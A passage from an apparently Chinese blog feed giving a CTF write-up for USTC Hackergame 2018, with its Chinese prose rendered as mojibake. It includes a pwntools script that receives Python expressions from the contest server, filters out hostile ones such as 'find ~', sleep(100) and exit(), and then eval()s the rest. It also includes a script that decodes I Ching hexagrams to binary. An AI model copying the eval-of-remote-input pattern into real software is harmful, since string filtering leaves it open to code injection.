class="headerlink" title="çŒ«å’ªå…‹æ˜Ÿ"></a>çŒ«å’ªå…‹æ˜Ÿ</h2><blockquote><p>nc 202.38.95.46 12009 </p><p>èŸ’è›‡æ˜¯ä¸€ç§éå¸¸å®¹æ˜“ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ï¼Œè€ƒéªŒä½ åƒä¸åƒèŸ’è›‡çš„æ ‡å‡†å°±æ˜¯ç»™ä½ ä¸€äº› Python 3 è¡¨è¾¾å¼ã€‚å¦‚æœä½ èƒ½æ­£ç¡®è®¡ç®—å‡ºæ¥ï¼Œä½ å°±é€šè¿‡äº†éªŒè¯ã€‚ </p><p>ç®€å•æ¥è¯´å°±æ˜¯è¦åœ¨30ç§’å†…å®ŒæˆæŒ‡å®šæ¬¡æ•°è¡¨è¾¾å¼çš„è®¡ç®—ï¼Œç„¶åå¯ä»¥å¾—åˆ°æœåŠ¡å™¨ç»™å‡ºçš„flagï¼Œä½†æ˜¯å‘çˆ¹çš„æ˜¯è¡¨è¾¾å¼ä¸­æœ‰ä¸€äº›ç‰¹æ®Šå‡½æ•°ï¼Œç±»ä¼¼äºç›®å½•éå† find ~,sleep(100),exit()ï¼Œæ‰€ä»¥è¿™ç§ä¸œè¥¿æˆ‘é‡‡å–äº†æ›¿æ¢çš„æ–¹æ³•ã€‚<br>â€‹<br>å› ä¸ºprintå‡½æ•°åœ¨python3å’Œpython2ä¸­ä¸åŒï¼Œè€Œæˆ‘éœ€è¦ä½¿ç”¨python2ä¸­çš„pwntoolsåº“ï¼ˆpython3çš„socketä¸çŸ¥ä¸ºä½•æ— ç”¨ï¼‰ï¼ŒåŒæ—¶æ‹¥æœ‰python3çš„printå‡½æ•°ç‰¹æ€§ï¼Œè¿™æ—¶å€™å°±éœ€è¦:</p><p>from _ _ future _ _ import print_function</p><p>å¼•å…¥python3 printå‡½æ•°ã€‚</p><p>æœ€ç»ˆè„šæœ¬å¦‚ä¸‹(è„šæœ¬æ¯”è¾ƒç®€é™‹ï¼Œå¯èƒ½éœ€è¦å¤šè·‘å‡ æ¬¡æ‰èƒ½å‡ºflag)ï¼š</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.95.46"</span><span class="token punctuation">,</span><span class="token number">12009</span><span class="token punctuation">)</span>getit <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'sleep(100)'</span><span class="token punctuation">,</span><span class="token string">'int(1)'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'exit()'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'find ~'</span><span class="token punctuation">,</span><span class="token string">'echo 1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"__import__('time')."</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    key <span class="token operator">=</span> eval<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> strings<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><blockquote><p>è„šæœ¬è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p></blockquote><p><img src="https://i.loli.net/2018/10/12/5bc05b09d0ecf.png" alt=""></p><h2 id="çŒ«å’ªç”µè·¯"><a href="#çŒ«å’ªç”µè·¯" class="headerlink" title="çŒ«å’ªç”µè·¯"></a>çŒ«å’ªç”µè·¯</h2><blockquote><p>å½“å¹´ç©çš„minercraftè¢«åšæˆäº†é¢˜ç›®ï¼Œå¥½å§ï¼Œçº¢çŸ³ç”µè·¯ï¼Œè¿™æ˜¯ä¸€ä¸ªå­˜æ¡£ï¼Œéœ€è¦æˆ‘ä»¬æŒ‰è§„å¾‹è¾“å…¥ä¿¡å·ï¼Œç„¶åç›´åˆ°å…‰æŸ±äº®èµ·ï¼Œæ­£ç¡®çš„ä¿¡å·å³ä¸ºflag:</p><p>flag{0110101000111100101111111111111111111010} </p></blockquote><h2 id="FLXG-çš„ç§˜å¯†"><a href="#FLXG-çš„ç§˜å¯†" class="headerlink" title="FLXG çš„ç§˜å¯†"></a>FLXG çš„ç§˜å¯†</h2><blockquote><p>é¢˜ç›®æœ‰ç‚¹é•¿ï¼Œæˆ‘æ€»ç»“ä¸€ä¸‹ï¼Œç»™å‡ºçš„æ–‡ä»¶ä¸­æ˜¯ä¼ç¾²å…­åå››å¦çš„å¦è±¡ï¼Œç®€å•æœç´¢ä¸€ä¸‹å¯ä»¥çŸ¥é“ï¼Œä¼ç¾²å…­åå››å¦å¯ä»¥è·ŸäºŒè¿›åˆ¶æ‰¯ä¸Šå…³ç³»ï¼Œå…­åå››å¦åˆ†åˆ«å¯¹åº”äºŒè¿›åˆ¶000000-111111ï¼Œå¯¹åº”å…³ç³»å¦‚ä¸‹:</p></blockquote><pre class=" language-shell"><code class="language-shell">'å¤': '000000', 'å‰¥': '000001', 'æ¯”': '000010', 'è§‚': '000011', 'è±«': '000100', 'æ™‹': '000101', 'èƒ': '000110', 'å¦': '000111', 'è°¦': '001000', 'è‰®': '001001', 'è¹‡': '001010', 'æ¸': '001011', 'å°è¿‡': '001100', 'æ—…': '001101', 'å’¸': '001110', 'é': '001111', 'å¸ˆ': '010000', 'è’™': '010001', 'å': '010010', 'æ¶£': '010011', 'è§£': '010100', 'æœªæµ': '010101', 'å›°': '010110', 'è®¼': '010111', 'å‡': '011000', 'è›Š': '011001', 'äº•': '011010', 'å·½': '011011', 'æ’': '011100', 'é¼': '011101', 'å¤§è¿‡': '011110', 'å§¤': '011111', 'å¤': '100000', 'é¢': '100001', 'å±¯': '100010', 'ç›Š': '100011', 'éœ‡': '100100', 'å™¬å—‘': '100101', 'éš': '100110', 'æ— å¦„': '100111', 'æ˜å¤·': '101000', 'è´²': '101001', 'æ—¢æµ': '101010', 'å®¶äºº': '101011', 'ä¸°': '101100', 'ç¦»': '101101', 'é©': '101110', 'åŒäºº': '101111', 'ä¸´': '110000', 'æŸ': '110001', 'èŠ‚': '110010', 'ä¸­å­š': '110011', 'å½’å¦¹': '110100', 'ç½': '110101', 'å…‘': '110110', 'å±¥': '110111', 'æ³°': '111000', 'å¤§ç•œ': '111001', 'éœ€': '111010', 'å°ç•œ': '111011', 'å¤§å£®': '111100', 'å¤§æœ‰': '111101', 'å¤¬': '111110', 'ä¹¾': '111111'</code></pre><blockquote><p>å†™ä¸€ä¸ªpythonè„šæœ¬å°†é‚£ä¸ªæ–‡ä»¶ä¸­çš„å¦è±¡åˆ†åˆ«è§£æˆäºŒè¿›åˆ¶ï¼Œå¯ä»¥å‘ç°bitæ•°æ­£å¥½æ˜¯4039032ï¼Œå¯ä»¥æ•´é™¤8ï¼ˆ8bitä¸º1byteï¼‰ã€‚åˆ°è¿™åŸºæœ¬ä¸Šå¯ä»¥åˆ¤æ–­æ€è·¯æ­£ç¡®ã€‚</p><p>è„šæœ¬å¦‚ä¸‹:</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> respecial <span class="token operator">=</span> <span class="token triple-quoted-string string">'''ä¹¾ï¹‘å¤ï¹‘å±¯ï¹‘è’™ï¹‘éœ€ï¹‘è®¼ï¹‘å¸ˆï¹‘æ¯”ï¹‘å°ç•œï¹‘å±¥ï¹‘æ³°ï¹‘å¦ï¹‘åŒäººï¹‘å¤§æœ‰ï¹‘è°¦ï¹‘è±«ï¹‘éšï¹‘è›Šï¹‘ä¸´ï¹‘è§‚ï¹‘å™¬å—‘ï¹‘è´²ï¹‘å‰¥ï¹‘å¤ï¹‘æ— å¦„ï¹‘å¤§ç•œï¹‘é¢ï¹‘å¤§è¿‡ï¹‘åï¹‘ç¦»ï¹‘å’¸ï¹‘æ’ï¹‘éï¹‘å¤§å£®ï¹‘æ™‹ï¹‘æ˜å¤·ï¹‘å®¶äººï¹‘ç½ï¹‘è¹‡ï¹‘è§£ï¹‘æŸï¹‘ç›Šï¹‘å¤¬ï¹‘å§¤ï¹‘èƒï¹‘å‡ï¹‘å›°ï¹‘äº•ï¹‘é©ï¹‘é¼ï¹‘éœ‡ï¹‘è‰®ï¹‘æ¸ï¹‘å½’å¦¹ï¹‘ä¸°ï¹‘æ—…ï¹‘å·½ï¹‘å…‘ï¹‘æ¶£ï¹‘èŠ‚ï¹‘ä¸­å­šï¹‘å°è¿‡ï¹‘æ—¢æµï¹‘æœªæµ'''</span><span class="token comment" spellcheck="true">#äºŒè¿›åˆ¶é¡ºåºçš„å¦è±¡</span>guashu <span class="token operator">=</span> <span class="token triple-quoted-string string">'''å¤ã€å‰¥ã€æ¯”ã€è§‚ã€è±«ã€æ™‹ã€èƒã€å¦ã€è°¦ã€è‰®ã€è¹‡ã€æ¸ã€å°è¿‡ã€æ—…ã€å’¸ã€éã€å¸ˆã€è’™ã€åã€æ¶£ã€è§£ã€æœªæµã€å›°ã€è®¼ã€å‡ã€è›Šã€äº•ã€å·½ã€æ’ã€é¼ã€å¤§è¿‡ã€å§¤ã€å¤ã€é¢ã€å±¯ã€ç›Šã€éœ‡ã€å™¬å—‘ã€éšã€æ— å¦„ã€æ˜å¤·ã€è´²ã€æ—¢æµã€å®¶äººã€ä¸°ã€ç¦»ã€é©ã€åŒäººã€ä¸´ã€æŸã€èŠ‚ã€ä¸­å­šã€å½’å¦¹ã€ç½ã€å…‘ã€å±¥ã€æ³°ã€å¤§ç•œã€éœ€ã€å°ç•œã€å¤§å£®ã€å¤§æœ‰ã€å¤¬ã€ä¹¾'''</span><span class="token keyword">def</span> <span class="token function">Getword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    s<span class="token operator">=</span>special<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'ï¹‘'</span><span class="token punctuation">)</span>    s2 <span class="token operator">=</span> guashu<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"ã€"</span><span class="token punctuation">)</span>    diction <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'G://æ•°æ®//ctfèµ›é¢˜//ä¸­ç§‘å¤§ctf//flxgçš„ç§˜å¯†.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        strings2 <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> strings2<span class="token punctuation">:</span>            strings<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> set<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#å› ä¸ºå¦è±¡ä¸­å­˜åœ¨ä¸€ä¸ªå­—æˆ–è€…ä¸¤ä¸ªå­—çš„å¦è±¡ï¼Œjiebaåˆ†è¯åº“ä¸å‡†ç¡®ï¼Œå°±ç”¨/æ¥åŒºåˆ«</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        diction<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>strings2<span class="token punctuation">.</span>count<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        strings2 <span class="token operator">=</span> strings2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">'/'</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2 <span class="token operator">=</span> Getword<span class="token punctuation">(</span><span class="token punctuation">)</span>    finalbin <span class="token operator">=</span><span class="token string">''</span>    finaldiclist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    dicts<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> diction<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        n<span class="token operator">+=</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">6</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'bits='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    finalstrings <span class="token operator">=</span> strings2<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> finalstrings<span class="token punctuation">:</span>        <span class="token keyword">if</span> a <span class="token keyword">in</span> s2<span class="token punctuation">:</span>            finaldiclist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#å»ºç«‹å¦è±¡ä¸äºŒè¿›åˆ¶çš„å…³ç³»å­—å…¸</span>    nice <span class="token operator">=</span><span class="token number">0</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s2<span class="token punctuation">:</span>        dicts<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> format<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>finaldiclist<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#æŒ‰å­—å…¸è§£å¯†å†™å…¥æ–‡ä»¶</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> finaldiclist<span class="token punctuation">:</span>        finalbin<span class="token operator">+=</span>dicts<span class="token punctuation">[</span>b<span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'finalbin.txt'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ff<span class="token punctuation">:</span>        ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>finalbin<span class="token punctuation">)</span></code></pre><p><img src="https://i.loli.net/2018/10/12/5bc07be42ac0e.png" alt=""></p><blockquote><p>æ¥ä¸‹æ¥åˆ©ç”¨pythonçš„libnumåº“ï¼Œå°†äºŒè¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¾—åˆ°ç¬¬ä¸€ä¸ªflagï¼š</p></blockquote><p>  <img src="https://i.loli.net/2018/10/12/5bc0611d2a07a.png" alt=""></p><blockquote><p>ç”¨binwalkåˆ†æä¸€ä¸‹å†…å®¹ï¼Œå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè¿›è¡Œæå–å¾—åˆ°ä»¥ä¸‹æ–‡ä»¶ï¼šä¸€ä¸ªflag elfç¨‹åº ï¼Œpasskey.txtï¼Œç®€å•çœ‹ä¸€ä¸‹ï¼Œæ¥ä¸‹æ¥çš„ç¬¬äºŒé¢˜åº”è¯¥æ˜¯é€†å‘äº†ã€‚ã€‚å¾…æ›´æ–°ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2018/10/12/5bc061b548e19.png" alt=""></p></blockquote><p>å…ˆåˆ°è¿™ ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;ä¸­ç§‘å¤§-Hackergame2018-write-up&quot;&gt;&lt;a href=&quot;#ä¸­ç§‘å¤§-Hackergame2018-write-up&quot; class=&quot;headerlink&quot; title=&quot;ä¸­ç§‘å¤§-Hackergame2018 write-
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="writeup" scheme="http://www.yof3ng.xyz/tags/writeup/"/>
    
      <category term="ustc" scheme="http://www.yof3ng.xyz/tags/ustc/"/>
    
  </entry>
  
</feed>
